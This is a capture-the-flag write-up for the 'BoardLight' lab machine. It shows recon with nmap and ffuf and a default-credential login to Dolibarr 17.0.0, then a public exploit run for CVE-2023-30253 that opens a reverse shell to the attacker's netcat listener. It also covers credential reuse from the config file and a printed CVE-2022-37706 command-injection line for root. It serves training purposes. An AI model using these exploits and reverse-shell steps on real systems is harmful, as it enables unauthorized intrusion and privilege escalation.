Let's start with nmap_

nmap -A -sC -sV 10.10.11.11
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 15:54 CEST
Nmap scan report for 10.10.11.11
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

We find an Apache 2.4 Web server on port 80. The site is really simple with no forms or other way to interact.
We launch feroxbuster to search files and directories on the website but with no result.

Seems there isn't much we can do here :( So let's try searching subdomains:

ffuf -u http://board.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.board.htb" 

(filtering with option -fs based on the size of all failed requests)

Wow, we found a crm subdomain. Add it to our /etc/hosts file 
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
10.10.11.25 greenhorn.htb
10.10.11.11 board.htb
10.10.11.11 crm.board.htb

And search for it on the browser :).

Seems a crm framework login page. The CRM is called Dolibar v.17.0.0. Clever thing to do is search online for possibile vulnerabilities.
Infact we find out that Dolibar <= 17.0.0 suffer php code injection (https://www.swascan.com/security-advisory-dolibarr-17-0-0/)
The blog metion the vulnerability as Authenticated PHP Code Injection so we must login to use it.

Searching online for default creds we find the classic admin admin :D, trying to login we access to the admin dashboard.

Then I found online a POC for this PHP code injection: https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

We launch the exploit specifying our target hostname, username, password, our IP, our port (for rev shell on which we are in listening mode -- nc -lnvp 9001)

python3 exploit.py http://crm.board.htb admin admin 10.10.14.152 9001
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection

We got the shell on www-data user!

After some enumeration, using Linpeas and searching in directories we didn't find anything interesting. Then I had an idea, i searched online for
the path in which config params of Dolibarr are stored and I found juicy infos in them:

www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='****';
$dolibarr_main_db_pass='********';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

Accessing mysql console with these creds we find a table with user rows. We find 2 rows for an admin and a superadmin with 2 hashes.
I tried to crack them with hashcat with no result. So I had the idea of use the DB passw found in conf file to change user.

Checking the /etc/passw file we can find out that there is a user called larissa.

I tried to login and boom we got the user!

The priv esc part is pretty easy. We upload on the machine linpeas program to enumerate possible vulns.

We find some interesting info in SUID section:

-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)

It is related to some utils called enlightment. Searching online we find the CVE-2022-37706, that shows the program allow local user to gain root privileges
taking advantage of a not fully secure path check (check that the path starts with /dev/):

${enlightment_file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

You can find the entire exploit at this link: https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main

Root owned :D
